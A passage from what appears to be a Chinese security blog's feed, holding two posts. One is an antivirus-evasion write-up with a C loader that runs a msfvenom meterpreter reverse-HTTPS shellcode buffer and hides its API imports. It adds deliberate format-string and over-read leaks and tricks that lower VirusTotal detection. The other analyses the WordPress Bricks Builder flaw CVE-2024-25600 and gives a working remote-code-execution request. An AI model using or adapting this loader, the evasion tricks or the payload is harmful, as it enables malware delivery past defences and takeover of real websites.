class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// msfvenom -p windows/meterpreter/reverse_https lhost=xxx lport=xxx -f c</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52&quot;</span><br><span class="line">...</span><br><span class="line">&quot;\x30\x2e\x32\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 载入kernel32.dll</span><br><span class="line">    HMODULE hKernel32 = LoadLibraryA(&quot;kernel32.dll&quot;);</span><br><span class="line">    if (!hKernel32) &#123;</span><br><span class="line">        printf(&quot;LoadLibraryA failed. Error: %d&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合VirtualAlloc的原型</span><br><span class="line">    LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID (WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, &quot;VirtualAlloc&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合RtlMoveMemory的原型</span><br><span class="line">    VOID (WINAPI *pRtlMoveMemory)(VOID UNALIGNED*, const VOID UNALIGNED*, SIZE_T) = (VOID (WINAPI*)(VOID UNALIGNED*, const VOID UNALIGNED*, SIZE_T))GetProcAddress(hKernel32, &quot;RtlMoveMemory&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合VirtualProtect的原型</span><br><span class="line">    BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) = (BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetProcAddress(hKernel32, &quot;VirtualProtect&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合CreateThread的原型</span><br><span class="line">    HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =</span><br><span class="line">        (HANDLE (WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(hKernel32, &quot;CreateThread&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合WaitForSingleObject的原型</span><br><span class="line">    DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD) = (DWORD (WINAPI*)(HANDLE, DWORD))GetProcAddress(hKernel32, &quot;WaitForSingleObject&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合CloseHandle的原型</span><br><span class="line">    BOOL (WINAPI *pCloseHandle)(HANDLE) = (BOOL (WINAPI*)(HANDLE))GetProcAddress(hKernel32, &quot;CloseHandle&quot;);</span><br><span class="line"></span><br><span class="line">  // 如果哪一个句柄值为false，表示获取失败，程序退出</span><br><span class="line">    if (!pVirtualAlloc || !pRtlMoveMemory || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject || !pCloseHandle) &#123;</span><br><span class="line">        printf(&quot;GetProcAddress failed. Error: %d&quot;, GetLastError);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 分配内存</span><br><span class="line">    LPVOID allocatedMemory = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    // 拷贝内存</span><br><span class="line">    pRtlMoveMemory(allocatedMemory, buf, sizeof(buf));</span><br><span class="line"></span><br><span class="line">    // 修改内存属性</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    if (!pVirtualProtect(allocatedMemory, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class="line">        printf(&quot;VirtualProtect failed. Error: %d&quot;, GetLastError);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 创建线程执行内存</span><br><span class="line">    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;CreateThread failed. Error: %d&quot;, GetLastError);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 等待线程完成</span><br><span class="line">    pWaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    pCloseHandle(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码编译执行后，Meterpreter可成功收到反连，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/03.png" alt="image">  </p><p>通过<a href="https://github.com/hasherezade/pe-bear">PE-bear</a>查看，可以看到IAT中不再有之前的几个Win32 API，仅有LoadLibrary、GetProcAddress，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/04.png" alt="image">  </p><p>再进化后，当今动态获取函数地址主流的方式是查询PEB和EAT，这样在IAT中连GetModuleHandle、GetProcAddress也不会出现，甚至还可以遍历内存，通过特征匹配定位函数，进而动态获取函数地址，不过今天要分享的是一个好玩的东西，通过故意泄露内存地址，然后通过NtReadVirtualMemory读取内存来获取函数地址</p><h1 id="今生"><a href="#今生" class="headerlink" title="今生"></a>今生</h1><h2 id="resolve-c"><a href="#resolve-c" class="headerlink" title="resolve.c"></a>resolve.c</h2><p>首先我们有这样一个工具<a href="https://github.com/ybdt/evasion-hub/blob/master/01-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/resolve.c">resolve.c</a>，传入NtReadVirtualMemory的地址、DLL名称、函数名称后，可以计算出函数地址</p><p>代码比较多我就不贴出来了，基本原理是通过Native API解析PE及PEB，进而获取DLL基址和函数地址，展开讲的话内容比较多，由于不是本篇文章的重点，先不去细究</p><p>VS2022下编译后，用法如下图</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/09.png" alt="image"></p><p>接下来的问题是如何获得NtReadVirtualMemory的地址</p><h2 id="方式1-直接输出"><a href="#方式1-直接输出" class="headerlink" title="方式1 直接输出"></a>方式1 直接输出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">    </span><br><span class="line">    FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;[+] NtReadVirtualMemory address: \t0x%p\n&quot;, pNtReadVirtualMemory);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后执行如下</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/05.png" alt="image"></p><p>将Leak-1.exe传到VT上，可以看到是11/72的检测率</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/06.png" alt="image"></p><p>上面的代码太少了，很容易被检测，我们用AI生成一个C++实现的200行的任务管理器，并将上面的代码插入其中，当输入我们自定义的z时，会输出NtReadVirtualMemory的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/07.png" alt="image"></p><p>将Leak-2.exe传到VT上，可以看到是5/72的检测率，检测率降低了将近一半</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/08.png" alt="image"></p><p>尝试用AI生成别的程序，包括涉及进程管理的控制台任务管理器、涉及文件操作的控制台学生成绩管理系统、甚至不涉及进程管理和文件操作的数学运算、C语言版本、C++版本、加上元数据，传到VT上后，至少会有2个杀毒引擎检测到，实在无奈</p><p>不过，尽管VT上显示Microsoft将其标识为恶意的，但在本地Defender中，并不会查杀</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/10.png" alt="image"></p><h2 id="方式2-格式化字符串漏洞"><a href="#方式2-格式化字符串漏洞" class="headerlink" title="方式2 格式化字符串漏洞"></a>方式2 格式化字符串漏洞</h2><p>下述代码是一个典型的格式化字符串漏洞，使用sprintf将格式化数据写入input时，由于没有指定变量，所以会随机打印栈上的值，其中就包括上面定义的leakme1的值，也就造成了内存地址泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">   FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">   </span><br><span class="line">   long long leakme1 = (long long) pNtReadVirtualMemory;</span><br><span class="line">   char input[100];</span><br><span class="line">   sprintf(input, &quot;%p %p %p %p\n&quot;);</span><br><span class="line">   printf(input);</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接在VS2022中编译，默认会带有各种优化，导致不能触发格式化字符串漏洞，需要使用如下命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl FormatStringLeak.cpp /Od /Zi /RTC1</span><br></pre></td></tr></table></figure><p>执行后可以看到，输出的四个地址中，有一个是NtReadVirtualMemory的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/11.png" alt="image"></p><h2 id="方式3-栈越界读"><a href="#方式3-栈越界读" class="headerlink" title="方式3 栈越界读"></a>方式3 栈越界读</h2><p>下述代码原理和上面有点类似，字符数组buffer只有8字节，在栈上越界读，可以读到保存NtReadVirtualMemory地址的变量，之所以选择ptr[23]-ptr[16]，是经过测试发现，这几个字节保存的是NtReadVirtualMemory地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">   FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">   </span><br><span class="line">   char buffer[8] = &quot;leak&quot;;</span><br><span class="line">   long long leakme1 = (long long) pNtReadVirtualMemory;</span><br><span class="line">   unsigned char *ptr = (unsigned char *)buffer;</span><br><span class="line">   </span><br><span class="line">   for (int i = 23; i &gt;= 16; i--) &#123;</span><br><span class="line">       printf(&quot;%02X&quot;, ptr[i]); </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl StackOverRead.cpp /Od /Zi /RTC1</span><br></pre></td></tr></table></figure><p>执行后可以看到，成功输出的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/12.png" alt="image"></p><h2 id="方式4-堆越界读"><a href="#方式4-堆越界读" class="headerlink" title="方式4 堆越界读"></a>方式4 堆越界读</h2><p>下述代码原理和上面的栈越界读基本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">   FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">   </span><br><span class="line">   char *buffer = (char *)malloc(32);</span><br><span class="line">   strcpy(buffer, &quot;leak&quot;);</span><br><span class="line">   uintptr_t *leakme1 = (uintptr_t *)(buffer + 16);</span><br><span class="line">   *leakme1 = (uintptr_t)pNtReadVirtualMemory;</span><br><span class="line">   </span><br><span class="line">   for (int i = 23; i &gt;= 16; i--) &#123; printf(&quot;%02X&quot;, (unsigned char)buffer[i]); &#125;</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl HeapOverRead.cpp /Od /Zi /RTC1</span><br></pre></td></tr></table></figure><p>编译后执行，可以看到，成功输出了NtReadVirtualMemory的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/13.png" alt="image"></p><p>上述代码，结合AI生成的代码，执行后如下图</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/14.png" alt="image"></p><p>在Defender下测试，不会被拦截</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/15.png" alt="image"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>把输出的函数地址和resolve相结合，可以成功获取到NTAPI的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/16.png" alt="image"></p><p>如何更好的融入到实战中，还有待探索</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前世&quot;&gt;&lt;a href=&quot;#前世&quot; class=&quot;headerlink&quot; title=&quot;前世&quot;&gt;&lt;/a&gt;前世&lt;/h1&gt;&lt;h2 id=&quot;Win32-API&quot;&gt;&lt;a href=&quot;#Win32-API&quot; class=&quot;headerlink&quot; title=&quot;Win32 A</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="API隐藏" scheme="http://example.com/tags/API%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-25600 WordPress Bricks Builder远程代码执行漏洞分析</title>
    <link href="http://example.com/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2025-01-06T11:57:41.000Z</published>
    <updated>2025-08-14T14:05:13.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>朋友圈看到有人转发了一篇“CVE-2024-25600：WordPress Bricks Builder RCE”，感觉挺有意思，点进去看了下，可是从头到尾看得我有点迷糊，本着打破砂锅问到底的原则，本文试图以漏洞挖掘者的视角详细分析这个漏洞，试着讲清楚漏洞真正的成因，也在分析的过程中发现一些新的小东西，比如漏洞只影响1.9.1及之上的版本，网上都在说影响版本是&lt;=1.9.6，其实应该是1.9.1 &lt;= affected version &lt;= 1.9.6</p><p>这里想说句题外话，如果一篇文章看得你云里雾里，那不排除一种可能，这篇文章质量不高~</p><h1 id="0x01-漏洞宏观流程"><a href="#0x01-漏洞宏观流程" class="headerlink" title="0x01 漏洞宏观流程"></a>0x01 漏洞宏观流程</h1><p>漏洞最终触发点是eval执行了攻击者传入的恶意代码，导致任意代码执行<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01.png" alt="image"><br>其中参数$php_query_raw是攻击者可控的，路由也是攻击者可控的，最后在权限校验部分仅使用nonce进行权限校验，而nonce会泄露在前端源码中，至此《危险函数 -&gt; 用户输入 -&gt; 对应路由 -&gt; 权限绕过》全部满足，最终导致了前台RCE（实际的细节有些复杂…)</p><p>pyload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /WordPress-6.4.3/wp-json/bricks/v1/render\_element HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 270</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;postId&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;nonce&quot;: &quot; a980a714d9&quot;,</span><br><span class="line">    &quot;element&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;container&quot;,</span><br><span class="line">        &quot;settings&quot;: &#123;</span><br><span class="line">            &quot;hasLoop&quot;: &quot;&quot;,</span><br><span class="line">            &quot;query&quot;: &#123;&quot;useQueryEditor&quot;: &quot;&quot;,&quot;queryEditor&quot;: &quot;system(&#x27;calc&#x27;);&quot;,&quot;objectType&quot;: &quot;&quot;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞细节流程"><a href="#0x02-漏洞细节流程" class="headerlink" title="0x02 漏洞细节流程"></a>0x02 漏洞细节流程</h1><h2 id="01-危险函数"><a href="#01-危险函数" class="headerlink" title="01 危险函数"></a>01 危险函数</h2><p>危险函数是eval，平时挖漏洞时，危险函数可以通过Seay跑一遍后发现，从代码注释中可以看到，漏洞代码是自版本1.9.1才有的<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0a.png" alt="image">  </p><h2 id="02-用户输入"><a href="#02-用户输入" class="headerlink" title="02 用户输入"></a>02 用户输入</h2><p>从触发点往上回溯，可看到参数$php_query_raw的值来自于bricks_render_dynamic_data( $query_vars[‘queryEditor’], $post_id )的返回值<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02.png" alt="image">  </p><p>ctrl+鼠标左键，进去看下bricks_render_dynamic_data对$query_vars[‘queryEditor’]和$post_id有没有什么过滤，可以看到具体实现在render_content中<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/03.jpg" alt="image">  </p><p>继续跟进render_content，代码逻辑是：<br>如果第一个参数是数组且至少有一个元素，则直接返回第一个元素。<br>如果第一个参数中键name对应的值不为空，那么将键name对应的值赋值给第一个元素，否则将第一个参数转化为字符串类型后赋值给第一个参数。<br>如果第一个参数中不包含字符’{‘，则直接返回第一个参数。<br>如果第一个参数中包含字符串’{echo:’，那么去掉第一个参数中用来转义的反斜线。<br>如果$post_id的值为空，那么调用get_the_ID()并将返回值赋值给$post_id，否则$post_id的值不变。<br>$post_id经get_post()处理后赋值给$post。<br>将’bricks/dynamic_data/render_content’, $content, $post, $context经apply_filters处理后的返回值返回<br>（详细讲述代码逻辑太费劲了，估计看的人也费劲，后面只讲基本逻辑）<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/04.png" alt="image">  </p><p>现在我们梳理了bricks_render_dynamic_data内部做了什么，具体返回什么值要看传入什么样的参数，回到原来的地方，Database::$page_data[‘preview_or_post_id’]跟进后值是常量0，现在变量只剩$query_vars[‘queryEditor’]，向上找$query_vars[‘queryEditor’]发现没有，只找到$query_vars，$query_vars来自方法prepare_query_vars_from_settings的第一个参数$settings，也就是说，调用prepare_query_vars_from_settings时，第一个参数$settings需要满足：$settings-&gt;[‘query’]-&gt;[‘useQueryEditor’]存在且不为null、$settings-&gt;[‘query’]-&gt;[‘queryEditor’]不为空，还有一个条件，$object_type需要是[ ‘post’,’term’,’user’ ]中的一个，$object_type来自于self::get_query_object_type()，跟进get_query_object_type，基本逻辑是：根据全局变量$bricks_loop_query的值决定返回’post’还是’’<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.png" alt="image">  </p><p>ctrl+鼠标左键，看下哪些函数调用了prepare_query_vars_from_settings，可以看到只有2个，database.php和query.php，database.php看名字就知道是和数据库打交道的，如果漏洞点在这个文件中，很可能还需要一个sql注入漏洞将恶意代码注入到数据库中，所以优先选择query.php进行深入查看<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/07.png" alt="image">  </p><p>跟进query.php，可以看到在下图111行中调用了prepare_query_vars_from_settings，传入的是$this-&gt;settings，向上回溯发现$this-&gt;settings来自于$element[‘settings’]，并且这些代码处于else子句中，也就是说需要让$query_instance的值为false，$query_instance的值来自于self::get_query_by_element_id( $this-&gt;element_id )，$this-&gt;element_id的值来自于实例化类Query时传进来的参数$element<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/08.png" alt="image">  </p><p>跟进get_query_by_element_id里面看一下，可以看到如果传进来的$element_id为空的话，则返回false，也就符合上面说的进入else子句<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/09.png" alt="image">  </p><p>然后看下哪些地方实例化了类Query，可以看到一共有15处<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="image">  </p><p>先看第1处，ajax.php，需要满足$loop_element不存在或为false的时候，才会实例化类Query，向上找发现$loop_element的值默认为false，假如中间没改变$loop_element的值，是没法实例化类Query<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="image">  </p><p>向下会看到new $element_class_name( $element )这样一行代码，关键点就在这个地方，此处才是漏洞的真正成因，想要执行new $element_class_name( $element )需要$element_class_name表示的类存在，跟进Elements可以看到，里面定义了一个静态属性$elements，初始化之后，回将$element_names中的元素注册到$elements中<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="image">  </p><p>如下是注册到$elements中<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="image">  </p><p>再看一下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /WordPress-6.4.3/wp-json/bricks/v1/render\_element HTTP/1.1</span><br><span class="line">Host: 